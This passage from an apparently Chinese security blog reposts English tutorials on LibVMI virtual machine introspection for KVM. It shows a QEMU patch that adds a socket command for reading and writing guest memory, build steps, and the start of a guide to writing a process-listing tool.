class="number">1</span>;   <span class="comment">// read request</span></div><div class="line">  req.address = (<span class="keyword">uint64_t</span>) paddr;</div><div class="line">  req.length = (<span class="keyword">uint64_t</span>) length;</div><div class="line"></div><div class="line">  <span class="keyword">int</span> nbytes =</div><div class="line">  write(kvm_get_instance(vmi)-&gt;socket_fd, &amp;req,</div><div class="line">    <span class="keyword">sizeof</span>(<span class="keyword">struct</span> request));</div><div class="line">  <span class="keyword">if</span> (nbytes != <span class="keyword">sizeof</span>(<span class="keyword">struct</span> request)) &#123;</div><div class="line">    <span class="keyword">goto</span> error_exit;</div><div class="line">  &#125;</div><div class="line">  <span class="keyword">else</span> &#123;</div><div class="line">    <span class="comment">// get the data from kvm</span></div><div class="line">    nbytes =</div><div class="line">    read(kvm_get_instance(vmi)-&gt;socket_fd, buf, length + <span class="number">1</span>);</div><div class="line">    <span class="keyword">if</span> (nbytes != (length + <span class="number">1</span>)) &#123;</div><div class="line">      <span class="keyword">goto</span> error_exit;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="comment">// check that kvm thinks everything is ok by looking at the last byte</span></div><div class="line">    <span class="comment">// of the buffer, 0 is failure and 1 is success</span></div><div class="line">    <span class="keyword">if</span> (buf[length]) &#123;</div><div class="line">      <span class="comment">// success, return pointer to buf</span></div><div class="line">      <span class="keyword">return</span> buf;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line"></div><div class="line">  <span class="comment">// default failure</span></div><div class="line">  error_exit:</div><div class="line">  <span class="keyword">if</span> (buf)</div><div class="line">  <span class="built_in">free</span>(buf);</div><div class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>So it uses the socket_fd to communicate with the connection openned in Qemu to invoke the <code>cpu_physical_read_memory()</code>. So the same with write.</p>
<p>Above are the principle how Qemu-patch work in Libvmi for KVM support, you can find the whole patch <a href="https://github.com/libvmi/libvmi/tree/master/tools/qemu-kvm-patch" target="_blank" rel="external">here</a>, now it only support 0.14 and 1.2 versions. If you know how it works, you can modify the patch and apply your own Qemu version. For example, following is my patch for the Qemu in stable-1.6 branch, e82ee0845c3240541e79b9b521779b3f8743f1b4 commit:<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div class="line">145</div><div class="line">146</div><div class="line">147</div><div class="line">148</div><div class="line">149</div><div class="line">150</div><div class="line">151</div><div class="line">152</div><div class="line">153</div><div class="line">154</div><div class="line">155</div><div class="line">156</div><div class="line">157</div><div class="line">158</div><div class="line">159</div><div class="line">160</div><div class="line">161</div><div class="line">162</div><div class="line">163</div><div class="line">164</div><div class="line">165</div><div class="line">166</div><div class="line">167</div><div class="line">168</div><div class="line">169</div><div class="line">170</div><div class="line">171</div><div class="line">172</div><div class="line">173</div><div class="line">174</div><div class="line">175</div><div class="line">176</div><div class="line">177</div><div class="line">178</div><div class="line">179</div><div class="line">180</div><div class="line">181</div><div class="line">182</div><div class="line">183</div><div class="line">184</div><div class="line">185</div><div class="line">186</div><div class="line">187</div><div class="line">188</div><div class="line">189</div><div class="line">190</div><div class="line">191</div><div class="line">192</div><div class="line">193</div><div class="line">194</div><div class="line">195</div><div class="line">196</div><div class="line">197</div><div class="line">198</div><div class="line">199</div><div class="line">200</div><div class="line">201</div><div class="line">202</div><div class="line">203</div><div class="line">204</div><div class="line">205</div><div class="line">206</div><div class="line">207</div><div class="line">208</div><div class="line">209</div><div class="line">210</div><div class="line">211</div><div class="line">212</div><div class="line">213</div><div class="line">214</div><div class="line">215</div><div class="line">216</div><div class="line">217</div><div class="line">218</div><div class="line">219</div><div class="line">220</div><div class="line">221</div><div class="line">222</div><div class="line">223</div><div class="line">224</div><div class="line">225</div><div class="line">226</div><div class="line">227</div><div class="line">228</div><div class="line">229</div><div class="line">230</div><div class="line">231</div><div class="line">232</div><div class="line">233</div><div class="line">234</div><div class="line">235</div><div class="line">236</div><div class="line">237</div><div class="line">238</div><div class="line">239</div><div class="line">240</div><div class="line">241</div><div class="line">242</div><div class="line">243</div><div class="line">244</div><div class="line">245</div><div class="line">246</div><div class="line">247</div><div class="line">248</div><div class="line">249</div><div class="line">250</div><div class="line">251</div><div class="line">252</div><div class="line">253</div><div class="line">254</div><div class="line">255</div><div class="line">256</div><div class="line">257</div><div class="line">258</div><div class="line">259</div><div class="line">260</div><div class="line">261</div><div class="line">262</div><div class="line">263</div><div class="line">264</div><div class="line">265</div><div class="line">266</div><div class="line">267</div><div class="line">268</div><div class="line">269</div><div class="line">270</div><div class="line">271</div><div class="line">272</div><div class="line">273</div><div class="line">274</div><div class="line">275</div><div class="line">276</div><div class="line">277</div><div class="line">278</div><div class="line">279</div><div class="line">280</div><div class="line">281</div><div class="line">282</div><div class="line">283</div><div class="line">284</div><div class="line">285</div><div class="line">286</div><div class="line">287</div><div class="line">288</div><div class="line">289</div><div class="line">290</div><div class="line">291</div><div class="line">292</div><div class="line">293</div><div class="line">294</div><div class="line">295</div><div class="line">296</div><div class="line">297</div><div class="line">298</div><div class="line">299</div><div class="line">300</div><div class="line">301</div><div class="line">302</div><div class="line">303</div></pre></td><td class="code"><pre><div class="line"> diff --git a/Makefile.target b/Makefile.target</div><div class="line">index 9a49852..be93dd0 100644</div><div class="line">--- a/Makefile.target</div><div class="line">+++ b/Makefile.target</div><div class="line">@@ -113,7 +113,7 @@ endif #CONFIG_BSD_USER</div><div class="line"> #########################################################</div><div class="line"> # System emulator target</div><div class="line"> ifdef CONFIG_SOFTMMU</div><div class="line">-obj-y += arch_init.o cpus.o monitor.o gdbstub.o balloon.o ioport.o</div><div class="line">+obj-y += arch_init.o cpus.o monitor.o gdbstub.o balloon.o ioport.o memory-access.o</div><div class="line"> obj-y += qtest.o</div><div class="line"> obj-y += hw/</div><div class="line"> obj-$(CONFIG_FDT) += device_tree.o</div><div class="line">diff --git a/memory-access.c b/memory-access.c</div><div class="line">new file mode 100644</div><div class="line">index 0000000..2c81c48</div><div class="line">--- /dev/null</div><div class="line">+++ b/memory-access.c</div><div class="line">@@ -0,0 +1,205 @@</div><div class="line">+/*</div><div class="line">+ * Access guest physical memory via a domain socket.</div><div class="line">+ *</div><div class="line">+ * Copyright (C) 2011 Sandia National Laboratories</div><div class="line">+ * Author: Bryan D. Payne (bdpayne@acm.org)</div><div class="line">+ */</div><div class="line">+</div><div class="line">+#include "memory-access.h"</div><div class="line">+//#include "cpu-all.h"</div><div class="line">+#include "qemu-common.h"</div><div class="line">+#include "exec/cpu-common.h"</div><div class="line">+#include "config.h"</div><div class="line">+</div><div class="line">+#include &lt;stdlib.h&gt;</div><div class="line">+#include &lt;stdio.h&gt;</div><div class="line">+#include &lt;string.h&gt;</div><div class="line">+#include &lt;pthread.h&gt;</div><div class="line">+#include &lt;sys/types.h&gt;</div><div class="line">+#include &lt;sys/socket.h&gt;</div><div class="line">+#include &lt;sys/un.h&gt;</div><div class="line">+#include &lt;unistd.h&gt;</div><div class="line">+#include &lt;signal.h&gt;</div><div class="line">+#include &lt;stdint.h&gt;</div><div class="line">+</div><div class="line">+struct request&#123;</div><div class="line">+  uint8_t type;      // 0 quit, 1 read, 2 write, ... rest reserved</div><div class="line">+  uint64_t address;  // address to read from OR write to</div><div class="line">+  uint64_t length;   // number of bytes to read OR write</div><div class="line">+&#125;;</div><div class="line">+</div><div class="line">+typedef uint64_t target_phys_addr_t;</div><div class="line">+</div><div class="line">+  static uint64_t</div><div class="line">+connection_read_memory (uint64_t user_paddr, void *buf, uint64_t user_len)</div><div class="line">+&#123;</div><div class="line">+  target_phys_addr_t paddr = (target_phys_addr_t) user_paddr;</div><div class="line">+  target_phys_addr_t len = (target_phys_addr_t) user_len;</div><div class="line">+  void *guestmem = cpu_physical_memory_map(paddr, &amp;len, 0);</div><div class="line">+  if (!guestmem)&#123;</div><div class="line">+    return 0;</div><div class="line">+  &#125;</div><div class="line">+  memcpy(buf, guestmem, len);</div><div class="line">+  cpu_physical_memory_unmap(guestmem, len, 0, len);</div><div class="line">+</div><div class="line">+  return len;</div><div class="line">+&#125;</div><div class="line">+</div><div class="line">+  static uint64_t</div><div class="line">+connection_write_memory (uint64_t user_paddr, void *buf, uint64_t user_len)</div><div class="line">+&#123;</div><div class="line">+  target_phys_addr_t paddr = (target_phys_addr_t) user_paddr;</div><div class="line">+  target_phys_addr_t len = (target_phys_addr_t) user_len;</div><div class="line">+  void *guestmem = cpu_physical_memory_map(paddr, &amp;len, 1);</div><div class="line">+  if (!guestmem)&#123;</div><div class="line">+    return 0;</div><div class="line">+  &#125;</div><div class="line">+  memcpy(guestmem, buf, len);</div><div class="line">+  cpu_physical_memory_unmap(guestmem, len, 0, len);</div><div class="line">+</div><div class="line">+  return len;</div><div class="line">+&#125;</div><div class="line">+</div><div class="line">+  static void</div><div class="line">+send_success_ack (int connection_fd)</div><div class="line">+&#123;</div><div class="line">+  uint8_t success = 1;</div><div class="line">+  int nbytes = write(connection_fd, &amp;success, 1);</div><div class="line">+  if (1 != nbytes)&#123;</div><div class="line">+    printf("QemuMemoryAccess: failed to send success ack\n");</div><div class="line">+  &#125;</div><div class="line">+&#125;</div><div class="line">+</div><div class="line">+  static void</div><div class="line">+send_fail_ack (int connection_fd)</div><div class="line">+&#123;</div><div class="line">+  uint8_t fail = 0;</div><div class="line">+  int nbytes = write(connection_fd, &amp;fail, 1);</div><div class="line">+  if (1 != nbytes)&#123;</div><div class="line">+    printf("QemuMemoryAccess: failed to send fail ack\n");</div><div class="line">+  &#125;</div><div class="line">+&#125;</div><div class="line">+</div><div class="line">+  static void</div><div class="line">+connection_handler (int connection_fd)</div><div class="line">+&#123;</div><div class="line">+  int nbytes;</div><div class="line">+  struct request req;</div><div class="line">+</div><div class="line">+  while (1)&#123;</div><div class="line">+    // client request should match the struct request format</div><div class="line">+    nbytes = read(connection_fd, &amp;req, sizeof(struct request));</div><div class="line">+    printf("req is %d\n", req.type);</div><div class="line">+    if (nbytes != sizeof(struct request))&#123;</div><div class="line">+      // error</div><div class="line">+      continue;</div><div class="line">+    &#125;</div><div class="line">+    else if (req.type == 0)&#123;</div><div class="line">+      // request to quit, goodbye</div><div class="line">+      break;</div><div class="line">+    &#125;</div><div class="line">+    else if (req.type == 1)&#123;</div><div class="line">+      // request to read</div><div class="line">+      char *buf = malloc(req.length + 1);</div><div class="line">+      nbytes = connection_read_memory(req.address, buf, req.length);</div><div class="line">+      if (nbytes != req.length)&#123;</div><div class="line">+        // read failure, return failure message</div><div class="line">+        buf[req.length] = 0; // set last byte to 0 for failure</div><div class="line">+        nbytes = write(connection_fd, buf, 1);</div><div class="line">+      &#125;</div><div class="line">+      else&#123;</div><div class="line">+        // read success, return bytes</div><div class="line">+        buf[req.length] = 1; // set last byte to 1 for success</div><div class="line">+        nbytes = write(connection_fd, buf, nbytes + 1);</div><div class="line">+      &#125;</div><div class="line">+      free(buf);</div><div class="line">+    &#125;</div><div class="line">+    else if (req.type == 2)&#123;</div><div class="line">+      // request to write</div><div class="line">+      void *write_buf = malloc(req.length);</div><div class="line">+      nbytes = read(connection_fd, &amp;write_buf, req.length);</div><div class="line">+      if (nbytes != req.length)&#123;</div><div class="line">+        // failed reading the message to write</div><div class="line">+        send_fail_ack(connection_fd);</div><div class="line">+      &#125;</div><div class="line">+      else&#123;</div><div class="line">+        // do the write</div><div class="line">+        nbytes = connection_write_memory(req.address, write_buf, req.length);</div><div class="line">+        if (nbytes == req.length)&#123;</div><div class="line">+          send_success_ack(connection_fd);</div><div class="line">+        &#125;</div><div class="line">+        else&#123;</div><div class="line">+          send_fail_ack(connection_fd);</div><div class="line">+        &#125;</div><div class="line">+      &#125;</div><div class="line">+      free(write_buf);</div><div class="line">+    &#125;</div><div class="line">+    else&#123;</div><div class="line">+      // unknown command</div><div class="line">+      printf("QemuMemoryAccess: ignoring unknown command (%d)\n", req.type);</div><div class="line">+      char *buf = malloc(1);</div><div class="line">+      buf[0] = 0;</div><div class="line">+      nbytes = write(connection_fd, buf, 1);</div><div class="line">+      free(buf);</div><div class="line">+    &#125;</div><div class="line">+  &#125;</div><div class="line">+</div><div class="line">+  close(connection_fd);</div><div class="line">+&#125;</div><div class="line">+</div><div class="line">+  static void *</div><div class="line">+memory_access_thread (void *path)</div><div class="line">+&#123;</div><div class="line">+  struct sockaddr_un address;</div><div class="line">+  int socket_fd, connection_fd;</div><div class="line">+  socklen_t address_length;</div><div class="line">+</div><div class="line">+  printf("in memory_access_thread : %s\n", (char *)path);</div><div class="line">+</div><div class="line">+  socket_fd = socket(PF_UNIX, SOCK_STREAM, 0);</div><div class="line">+  if (socket_fd &lt; 0)&#123;</div><div class="line">+    printf("QemuMemoryAccess: socket failed\n");</div><div class="line">+    goto error_exit;</div><div class="line">+  &#125;</div><div class="line">+  unlink(path);</div><div class="line">+  address.sun_family = AF_UNIX;</div><div class="line">+  address_length = sizeof(address.sun_family) + sprintf(address.sun_path, "%s", (char *) path);</div><div class="line">+</div><div class="line">+  if (bind(socket_fd, (struct sockaddr *) &amp;address, address_length) != 0)&#123;</div><div class="line">+    printf("QemuMemoryAccess: bind failed\n");</div><div class="line">+    goto error_exit;</div><div class="line">+  &#125;</div><div class="line">+  printf("in memory_access_thread : %d\n", socket_fd);</div><div class="line">+  if (listen(socket_fd, 0) != 0)&#123;</div><div class="line">+    printf("QemuMemoryAccess: listen failed\n");</div><div class="line">+    goto error_exit;</div><div class="line">+  &#125;</div><div class="line">+</div><div class="line">+  connection_fd = accept(socket_fd, (struct sockaddr *) &amp;address, &amp;address_length);</div><div class="line">+  connection_handler(connection_fd);</div><div class="line">+</div><div class="line">+  close(socket_fd);</div><div class="line">+  unlink(path);</div><div class="line">+error_exit:</div><div class="line">+  return NULL;</div><div class="line">+&#125;</div><div class="line">+</div><div class="line">+  int</div><div class="line">+memory_access_start (const char *path)</div><div class="line">+&#123;</div><div class="line">+  pthread_t thread;</div><div class="line">+  sigset_t set, oldset;</div><div class="line">+  int ret;</div><div class="line">+</div><div class="line">+  // create a copy of path that we can safely use</div><div class="line">+  char *pathcopy = malloc(strlen(path) + 1);</div><div class="line">+  memcpy(pathcopy, path, strlen(path) + 1);</div><div class="line">+</div><div class="line">+  // start the thread</div><div class="line">+  sigfillset(&amp;set);</div><div class="line">+  pthread_sigmask(SIG_SETMASK, &amp;set, &amp;oldset);</div><div class="line">+  ret = pthread_create(&amp;thread, NULL, memory_access_thread, pathcopy);</div><div class="line">+  pthread_sigmask(SIG_SETMASK, &amp;oldset, NULL);</div><div class="line">+</div><div class="line">+  return ret;</div><div class="line">+&#125;</div><div class="line">diff --git a/memory-access.h b/memory-access.h</div><div class="line">new file mode 100644</div><div class="line">index 0000000..e538134</div><div class="line">--- /dev/null</div><div class="line">+++ b/memory-access.h</div><div class="line">@@ -0,0 +1,8 @@</div><div class="line">+/*</div><div class="line">+ * Mount guest physical memory using FUSE.</div><div class="line">+ *</div><div class="line">+ * Copyright (C) 2011 Sandia National Laboratories</div><div class="line">+ * Author: Bryan D. Payne (bdpayne@acm.org)</div><div class="line">+ */</div><div class="line">+</div><div class="line">+int memory_access_start (const char *path);</div><div class="line">diff --git a/monitor.c b/monitor.c</div><div class="line">index 99bfcd9..7dd4ac2 100644</div><div class="line">--- a/monitor.c</div><div class="line">+++ b/monitor.c</div><div class="line">@@ -67,6 +67,7 @@</div><div class="line"> #include "qmp-commands.h"</div><div class="line"> #include "hmp.h"</div><div class="line"> #include "qemu/thread.h"</div><div class="line">+#include "memory-access.h"</div><div class="line"></div><div class="line"> /* for pic/irq_info */</div><div class="line"> #if defined(TARGET_SPARC)</div><div class="line">@@ -1252,6 +1253,14 @@ static void do_print(Monitor *mon, const QDict *qdict)</div><div class="line">     monitor_printf(mon, "\n");</div><div class="line"> &#125;</div><div class="line"></div><div class="line">+static int do_physical_memory_access(Monitor *mon, const QDict *qdict, QObject **ret_data)</div><div class="line">+&#123;</div><div class="line">+    const char *path = qdict_get_str(qdict, "path");</div><div class="line">+    printf("in do_physical_memory_access : %s\n", path);</div><div class="line">+    memory_access_start(path);</div><div class="line">+    return 0;</div><div class="line">+&#125;</div><div class="line">+</div><div class="line"> static void do_sum(Monitor *mon, const QDict *qdict)</div><div class="line"> &#123;</div><div class="line">     uint32_t addr;</div><div class="line">diff --git a/qmp-commands.hx b/qmp-commands.hx</div><div class="line">index cf47e3f..41b3e1b 100644</div><div class="line">--- a/qmp-commands.hx</div><div class="line">+++ b/qmp-commands.hx</div><div class="line">@@ -610,6 +610,33 @@ Example:</div><div class="line"> EQMP</div><div class="line"></div><div class="line">     &#123;</div><div class="line">+        .name       = "pmemaccess",</div><div class="line">+        .args_type  = "path:s",</div><div class="line">+        .params     = "path",</div><div class="line">+        .help       = "mount guest physical memory image at 'path'",</div><div class="line">+        .user_print = monitor_user_noop,</div><div class="line">+        .mhandler.cmd_new = do_physical_memory_access,</div><div class="line">+    &#125;,</div><div class="line">+</div><div class="line">+SQMP</div><div class="line">+pmemaccess</div><div class="line">+----------</div><div class="line">+</div><div class="line">+Mount guest physical memory image at 'path'.</div><div class="line">+</div><div class="line">+Arguments:</div><div class="line">+</div><div class="line">+- "path": mount point path (json-string)</div><div class="line">+</div><div class="line">+Example:</div><div class="line">+</div><div class="line">+-&gt; &#123; "execute": "pmemaccess",</div><div class="line">+             "arguments": &#123; "path": "/tmp/guestname" &#125; &#125;</div><div class="line">+&lt;- &#123; "return": &#123;&#125; &#125;</div><div class="line">+</div><div class="line">+EQMP</div><div class="line">+</div><div class="line">+    &#123;</div><div class="line">         .name       = "migrate",</div><div class="line">         .args_type  = "detach:-d,blk:-b,inc:-i,uri:s",</div><div class="line">         .mhandler.cmd_new = qmp_marshal_input_migrate,</div></pre></td></tr></table></figure></p>
<p>After we apply the Qemuu patch, we can re-compile the Qemu:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ cd qemu</div><div class="line">$ ./configure</div><div class="line">$ make -jj4</div><div class="line">$ sudo make install</div></pre></td></tr></table></figure></p>
<p>In addition, as said in the Libvmi READM, you need to make sure your libvirt version is 0.8.7 or newer, and you should sure that the libvirt installation supports QMP commands, which can be done by install libyajl-dev (take my Debian as an example):<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">$ sudo aptitude install libyajl-dev</div><div class="line">$ cd libvirt</div><div class="line">$ ./configure</div></pre></td></tr></table></figure></p>
<p>And ensure that the configure script reports that it found yajl. Then you should compile the libvirt<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ make -j4</div><div class="line">$ sudo make install</div></pre></td></tr></table></figure></p>
<p>After that, you can setup libvmi as before.</p>
<hr>
<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmikvm/" target="_blank" rel="external">Libvmi Setup</a>》</p>

      
    </div>
    <footer class="entry-meta entry-footer">
      
	<span class="ico-folder"></span>
    <a class="article-category-link" href="/categories/虚拟机监控/">虚拟机监控</a>

      
  <span class="ico-tags"></span>
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Introspection/">Introspection</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/KVM/">KVM</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/System/">System</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Virtualization/">Virtualization</a></li></ul>

      
    </footer>
  </div>
  
</article>

<!-- Table of Contents -->

  
    <article id="post-libvmiintrospection"  class="article article-type-post" itemscope itemprop="blogPost" >
  <div id="articleInner" class="clearfix post-1016 post type-post status-publish format-standard has-post-thumbnail hentry category-template-2 category-uncategorized tag-codex tag-edge-case tag-featured-image tag-image tag-template">
    
    
      <header class="article-header">
        
  
    <h1 class="thumb" itemprop="name">
      <a class="article-title" href="/20170102/libvmiintrospection/">Write Introspection Tools Using Libvmi</a>
    </h1>
  

      </header>
    
    <div class="article-meta">
      
	Posted on <a href="/20170102/libvmiintrospection/" class="article-date">
	  <time datetime="2017-01-02T03:01:20.000Z" itemprop="datePublished">一月 2, 2017</time>
	</a>

    </div>
    <div class="article-entry" itemprop="articleBody">
      
        <p>作者：<a href="http://ytliu.info/blog/2013/08/14/write-introspection-tools-using-libvmi/" target="_blank" rel="external">ytliu</a><br>编辑：@Tula</p>
<hr>
<p><strong>CSysSec注</strong>： Libvmi是个虚拟机监控API，本文介绍如何利用Libvmi写自己的监控工具。作者ytliu，来自上海交通大学PhD,研究方向是虚拟化与系统安全，在顶会CCS，HPCA等发表多篇文章。<br><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20170102/libvmiintrospection/" target="_blank" rel="external">Libvmi Setup</a>》</p>
<hr>
<p>Last week I’ve discussed about how to <a href="http://www.csyssec.org/20170102/libvmisetup/" target="_blank" rel="external">setup libvmi</a>, in this post I will show you how to write introspection tools using libvmi.</p>
<p>The most typical example is <code>examples/process-list.c</code>:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;libvmi/libvmi.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div></pre></td></tr></table></figure></p>
<p>Firstly we need to include these header files, especially the <code>&lt;libvmi/libvmi.h&gt;</code>, it defines most of the variables and functions.</p>
<p>Then we should initialize the vmi environment:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* initialize the libvmi library */</span></div><div class="line"><span class="keyword">if</span> (vmi_init(&amp;vmi, VMI_AUTO | VMI_INIT_COMPLETE, name) == VMI_FAILURE) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to init LibVMI library.\n"</span>);</div><div class="line">    <span class="keyword">return</span> <span class="number">1</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>It will initialize the vmi (<code>vmi_instance_t</code>) struct with some platform information.<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* init the offset values */</span></div><div class="line"><span class="keyword">if</span> (VMI_OS_LINUX == vmi_get_ostype(vmi)) &#123;</div><div class="line">    tasks_offset = vmi_get_offset(vmi, <span class="string">"linux_tasks"</span>);</div><div class="line">    name_offset = vmi_get_offset(vmi, <span class="string">"linux_name"</span>);</div><div class="line">    pid_offset = vmi_get_offset(vmi, <span class="string">"linux_pid"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>Then in this case, we should read some offset of tast_struct from the config file <code>/etc/libvmi.conf</code>. And if you want to add a config argument like <code>linux_files</code>, you can do as follows:</p>
<p>Add an item in <code>libvmi/config/grammar.y</code>:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">%token&lt;str&gt;  LINUX_FILES</div><div class="line">...</div><div class="line">assignment:</div><div class="line">  |</div><div class="line">...</div><div class="line">  linux_state_assignment</div><div class="line">  |</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>Then add an item in <code>libvmi/config/lexicon.l</code>:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">linux_files  &#123; BeginToken(yytext); yylval.str = strndup(yytext, CONFIG_STR_LENGTH); <span class="keyword">return</span> LINUX_FILES;&#125;</div></pre></td></tr></table></figure></p>
<p>Then add corresponding <code>strncmp</code> in <code>libvmi/os/linux/core.c</code>:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"><span class="keyword">if</span> (stncmp(key, <span class="string">"linux_files"</span>, CONFIG_STR_LENGTH) == <span class="number">0</span>) &#123;</div><div class="line">  linux_instance-&gt;files_offset = *(<span class="keyword">int</span> *)value;</div><div class="line">  <span class="keyword">goto</span> _done;</div><div class="line">&#125;</div><div class="line">...</div><div class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">strncmp</span>(offset_name, <span class="string">"linux_files"</span>, max_length) == <span class="number">0</span>) &#123;</div><div class="line">  <span class="keyword">return</span> linux_instance-&gt;files_offset;</div><div class="line">&#125;</div><div class="line">...</div></pre></td></tr></table></figure></p>
<p>At last add the <code>files_offset</code> item to <code>struct linux_instance</code> in <code>libvmi/os/linux/linux.h</code>:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">struct</span> linux_instance &#123;</div><div class="line">  ...</div><div class="line">  <span class="keyword">uint64_t</span> files_offset;</div><div class="line">  ...</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<h3 id="Then-compile-again-after-that-your-can-add-linux-files-to-your-config-file"><a href="#Then-compile-again-after-that-your-can-add-linux-files-to-your-config-file" class="headerlink" title="Then compile again, after that your can add linux_files to your config file."></a>Then compile again, after that your can add linux_files to your config file.</h3><p>Now, let’s continue to look at the vmi code:<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">/* pause the vm for consistent memory access */</span></div><div class="line"><span class="keyword">if</span> (vmi_pause_vm(vmi) != VMI_SUCCESS) &#123;</div><div class="line">    <span class="built_in">printf</span>(<span class="string">"Failed to pause VM\n"</span>);</div><div class="line">    <span class="keyword">goto</span> error_exit;</div><div class="line">&#125; <span class="comment">// if</span></div></pre></td></tr></table></figure></p>
